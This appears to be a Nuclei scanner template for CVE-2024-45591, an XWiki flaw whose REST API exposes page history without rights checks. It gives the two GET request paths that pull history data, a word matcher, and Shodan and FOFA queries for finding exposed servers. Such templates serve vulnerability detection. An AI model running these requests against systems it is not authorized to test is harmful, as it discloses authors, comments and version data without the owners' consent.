id: CVE-2024-45591

info:
  name: XWiki Platform Unauthorized History Disclosure
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    XWiki Platform is a generic wiki platform where the REST API exposes the history of any page
    regardless of the rights setup. This vulnerability allows unauthorized access to the page history
    including modification times, version numbers, authors, and comments. This issue is patched in
    XWiki 15.10.9 and XWiki 16.3.0RC1.
  impact: |
    Unauthorized disclosure of historical data may lead to exposure of sensitive information.
  remediation: |
    Upgrade XWiki Platform to the latest version to mitigate CVE-2024-45591.
  reference:
    - https://github.com/fkie-cad/nvd-json-data-feeds
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2024-45591
    cwe-id: CWE-359,CWE-862
    epss-score: 0.00074
    epss-percentile: 0.33624
    cpe: cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*
  metadata:
    vendor: xwiki
    product: xwiki
    shodan-query: html:"data-xwiki-reference"
    fofa-query: body="data-xwiki-reference"

http:
  - method: GET
    path:
      - "/xwiki/rest/wikis/xwiki/spaces/Main/pages/WebHome/history"
      - "/xwiki/rest/wikis/xwiki/spaces/Main/pages/WebHome/translations/de/history"

    matchers:
      - type: word
        words:
          - "version"
          - "author"
        condition: and
